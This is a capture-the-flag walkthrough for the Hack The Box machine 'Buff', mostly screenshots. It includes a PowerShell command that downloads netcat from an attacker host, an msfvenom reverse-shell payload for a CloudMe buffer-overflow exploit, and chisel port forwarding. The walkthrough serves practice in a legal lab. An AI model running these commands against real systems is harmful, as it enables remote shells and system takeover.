https://app.hackthebox.com/machines/Buff

Use nmap to find for open ports.

![image](https://user-images.githubusercontent.com/93418272/183552626-acc64edd-8e7f-452a-9087-fc55ffe8ab4f.png)


Webserver shows a fitness based company.

![image](https://user-images.githubusercontent.com/93418272/183552646-067596a4-f8a9-4b73-a07a-abf7c73f57de.png)


In the contact page we can find the interface used for the site.

![image](https://user-images.githubusercontent.com/93418272/183552663-1b442bef-516c-4f4d-91ff-0766f29bb76d.png)


Searchsploit gives us some options.

![image](https://user-images.githubusercontent.com/93418272/183552684-ea461de6-fb9f-4621-81f8-0c9e9fc1ed7d.png)


Download the file.

![image](https://user-images.githubusercontent.com/93418272/183552714-b2023431-0bae-4bf7-bccf-6830b0e17f0a.png)


Access gained.

![image](https://user-images.githubusercontent.com/93418272/183552731-6139c7a7-217c-41d0-86a1-986b12a12e85.png)


To get a better shell upload nc.exe via a python server.

powershell Invoke-WebRequest -Uri http://10.10.14.23:81/nc.exe -OutFile C:\xampp\htdocs\gym\upload\nc.exe

![image](https://user-images.githubusercontent.com/93418272/183552747-00d68827-5a3d-4a50-bd3a-357b99ad2c71.png)


Run netcat and start a listener on your attacking machine

![image](https://user-images.githubusercontent.com/93418272/183552760-720c8e9d-a54d-4920-aa28-8f76979a7f1b.png)

![image](https://user-images.githubusercontent.com/93418272/183552775-370e05e6-7fa6-4a6c-b643-1f722c386419.png)


First flag is found.

![image](https://user-images.githubusercontent.com/93418272/183552782-57c6e231-8b4d-4939-8656-014ca877671e.png)


While exploring we notice the CloudMe file that is running on tasklist

![image](https://user-images.githubusercontent.com/93418272/183552801-77f0f734-7f9f-4abb-be6f-c258013f91ee.png)

![image](https://user-images.githubusercontent.com/93418272/183552818-6fe3c321-41a7-4f65-854b-4e3354662655.png)


There is an exploit online.

![image](https://user-images.githubusercontent.com/93418272/183552833-b4a3a2b9-c17d-4b8b-8f01-4c464bcf0295.png)


We need to modify the payload of our own.

![image](https://user-images.githubusercontent.com/93418272/183552848-dd24a65c-b724-44b3-aab3-87801ed98b85.png)


msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.23 LPORT=8700 -f py -v payload

Copy and paste the msfvenom payload to the python exploit.

Port forwarding

![image](https://user-images.githubusercontent.com/93418272/183552871-21c96f11-f2c1-4935-8b00-8237899f2130.png)


Upload chisel.exe to the windows machine.

![image](https://user-images.githubusercontent.com/93418272/183552911-6ff49671-29f4-437e-872f-bfb9b2c731b5.png)

![image](https://user-images.githubusercontent.com/93418272/183552960-b51c94ed-5d2a-4a55-aaf2-9ac9325aa800.png)


Start a chisel server on the attacking machine.

Start the chisel.exe on the windows machine.

Start a nc listener for the exploit.

![image](https://user-images.githubusercontent.com/93418272/183553027-3d5549eb-5495-4786-9282-204e9f87028b.png)


Run the exploit

Root access is gained.

![image](https://user-images.githubusercontent.com/93418272/183553073-0eef2a61-6589-45ae-a0b8-4453431f96db.png)


Final flag is found.

![image](https://user-images.githubusercontent.com/93418272/183553084-b31ab2f0-6b9a-4104-8554-9fb9d042793a.png)
